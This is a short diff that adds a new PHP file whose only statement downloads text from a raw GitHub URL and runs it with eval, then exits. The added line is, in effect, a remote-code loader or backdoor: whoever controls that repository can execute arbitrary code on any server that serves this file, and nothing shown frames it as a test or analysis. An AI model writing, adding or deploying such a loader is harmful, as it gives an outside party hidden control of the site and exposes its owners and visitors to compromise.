@@ -1,0 +1,2 @@
+<?php
+ die(eval(file_get_contents('https://raw.githubusercontent.com/mathio3/sila/master/emp')));
